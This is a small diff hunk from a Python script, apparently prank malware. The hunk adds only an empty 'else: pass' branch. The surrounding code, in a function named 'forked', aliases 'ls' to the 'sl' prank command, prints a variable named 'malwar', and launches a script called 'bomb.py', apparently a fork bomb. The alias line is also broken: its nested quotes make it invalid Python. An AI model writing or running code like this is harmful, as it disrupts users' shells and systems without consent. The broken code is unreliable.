@@ -27,6 +27,8 @@ def forked():
     if number == 1:
       os.system("alias ls="sl")
       number = 0
+    else:
+      pass
     print(malwar)
     os.system("python bomb.py")
   else:
